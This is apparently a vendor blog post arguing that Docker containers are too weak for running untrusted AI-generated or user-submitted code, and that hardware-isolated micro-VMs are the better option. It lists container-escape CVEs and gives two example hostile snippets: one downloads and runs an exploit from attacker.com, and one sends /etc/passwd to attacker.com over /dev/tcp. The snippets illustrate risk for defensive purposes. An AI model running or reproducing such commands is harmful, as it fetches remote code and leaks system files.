---
draft: false
title: "Container Security: Why Docker Isn't Enough for Untrusted Code"
snippet: "Docker containers were designed for trusted workloads. When running untrusted code from AI agents or users, you need stronger isolation. Here's why and what to do about it."
image: {
    src: "https://images.unsplash.com/photo-1558494949-ef010cbdcc31?&fit=crop&w=430&h=240",
    alt: "Container security and isolation"
}
publishDate: "2024-12-05 10:00"
category: "Security"
author: "BoxLite Team"
tags: [docker, security, containers, isolation]
---

**TL;DR:** Docker containers share the host kernel, and container escape vulnerabilities are discovered regularly. For trusted workloads you control, this risk is acceptable. For untrusted code (AI-generated, user-submitted), container escapes could be catastrophic. Hardware-isolated micro-VMs provide stronger guarantees.

## The container security model

Docker and other container runtimes use Linux kernel features for isolation:

- **Namespaces**: Separate views of system resources (PID, network, mount, etc.)
- **Cgroups**: Limit resource usage (CPU, memory, I/O)
- **Seccomp**: Filter available syscalls
- **Capabilities**: Restrict privileged operations

Together, these create a strong isolation boundary—for trusted workloads.

## Where container isolation breaks down

### 1. Shared kernel attack surface

All containers share the host kernel. The Linux kernel has:
- ~27 million lines of code
- ~400+ syscalls
- Complex subsystems (networking, filesystems, scheduling)

Any vulnerability in these subsystems can potentially be exploited from inside a container to escape to the host.

### 2. Container escape CVEs

Container escapes aren't theoretical. Here are some notable examples:

**CVE-2024-21626 (runc, January 2024)**
- Severity: High (8.6)
- Attack: Exploit `/proc/self/fd` handling during container creation
- Impact: Full container escape

**CVE-2020-15257 (containerd, November 2020)**
- Severity: Medium (5.2)
- Attack: Access host network namespace through abstract unix sockets
- Impact: Network-level access to host

**CVE-2019-5736 (runc, February 2019)**
- Severity: Critical (8.6)
- Attack: Overwrite host runc binary via /proc/self/exe
- Impact: Root access on host

**CVE-2022-0185 (Linux kernel, January 2022)**
- Severity: High (8.4)
- Attack: Heap overflow in legacy_parse_param
- Impact: Container escape to host

### 3. The trusted workload assumption

Container runtimes are designed assuming you trust the code. The isolation protects against:
- Accidental resource exhaustion
- Dependency conflicts between services
- Process isolation for multi-tenancy

They're not designed to contain actively malicious code trying to escape.

## When container isolation isn't enough

### AI agent code execution

AI agents generate code that you didn't write and can't fully predict:

```python
# AI agent might generate something like this
import subprocess
subprocess.run(["curl", "-o", "/dev/shm/x", "http://attacker.com/exploit"])
subprocess.run(["chmod", "+x", "/dev/shm/x"])
subprocess.run(["/dev/shm/x"])  # Runs exploit targeting container escape
```

### User-submitted code

Online judges, coding tutorials, and playgrounds run arbitrary user code:

```python
# User submits this "solution"
__import__('os').system('cat /etc/passwd > /dev/tcp/attacker.com/1234')
```

### Multi-tenant platforms

When customer code runs on your infrastructure, a container escape means:
- Access to other customers' data
- Access to your internal systems
- Regulatory compliance violations (HIPAA, PCI-DSS, SOC2)

## The defense-in-depth argument

Some argue you can harden containers sufficiently:
- Drop all capabilities
- Use seccomp to restrict syscalls
- Enable AppArmor/SELinux profiles
- Run as non-root
- Use read-only filesystems
- Network isolation

These help. But they're all layers on top of the fundamental shared-kernel architecture. Zero-days in the kernel bypass all of them.

## The hardware isolation alternative

Virtual machines provide a fundamentally different isolation boundary:

```
Container Model:
┌─────────────┬─────────────┐
│ Container A │ Container B │
├─────────────┴─────────────┤
│         Host Kernel       │  ← Shared!
├───────────────────────────┤
│          Hardware         │
└───────────────────────────┘

VM Model:
┌─────────────┬─────────────┐
│    VM A     │    VM B     │
│  (Kernel A) │  (Kernel B) │  ← Separate!
├─────────────┴─────────────┤
│    Hypervisor (KVM/HV)    │  ← Tiny attack surface
├───────────────────────────┤
│          Hardware         │
└───────────────────────────┘
```

### Why VMs are harder to escape

- Hypervisors (KVM, Hyper-V) are much smaller codebases
- The VM boundary is enforced by CPU hardware features (VT-x, AMD-V)
- Cloud providers stake their business on VM isolation working
- Hypervisor escapes are rare and extremely valuable (worth millions in bug bounties)

### The old VM problem: They're slow

Traditional VMs:
- Boot in 10-30 seconds
- Require 512MB+ memory
- Need complex orchestration (VMware, Hyper-V, etc.)

This made VMs impractical for the container use case.

## Micro-VMs: The best of both worlds

Micro-VMs like those used by BoxLite provide:
- **VM-level isolation**: Separate kernel per sandbox
- **Container-like speed**: Sub-second boot
- **Container-like UX**: Use OCI images directly
- **Minimal overhead**: ~50-100MB per VM

```python
import boxlite

# This runs in a hardware-isolated VM, not a container
async with boxlite.SimpleBox("python:slim") as box:
    result = await box.exec("python", "-c", untrusted_code)
```

## When to use what

| Scenario | Recommendation |
|----------|----------------|
| Your own microservices | Containers (Docker, Kubernetes) |
| CI/CD pipelines (your code) | Containers |
| AI agent code execution | Micro-VMs (BoxLite) |
| User-submitted code | Micro-VMs (BoxLite) |
| Multi-tenant customer code | Micro-VMs (BoxLite) |
| Compliance-sensitive workloads | Micro-VMs or traditional VMs |

## Making the switch

If you're currently using Docker for untrusted code:

**Before (Docker):**
```python
import subprocess

def run_user_code(code):
    subprocess.run([
        "docker", "run", "--rm",
        "--network=none",
        "--cap-drop=ALL",
        "python:slim",
        "python", "-c", code
    ])
```

**After (BoxLite):**
```python
import boxlite

async def run_user_code(code):
    async with boxlite.SimpleBox("python:slim") as box:
        result = await box.exec("python", "-c", code)
        return result.stdout
```

Same workflow, stronger isolation.

## Conclusion

Docker containers are excellent for deploying trusted applications. They're fast, efficient, and well-understood.

But when running untrusted code—AI-generated scripts, user submissions, customer workloads—container isolation isn't strong enough. The shared kernel creates a risk that can't be fully mitigated.

Hardware-isolated micro-VMs provide the isolation guarantees you need without sacrificing the developer experience. For untrusted code, use VM isolation.

---

*Learn more about BoxLite's isolation model in the [FAQ](/faq) or [comparison with Docker](/compare/docker).*
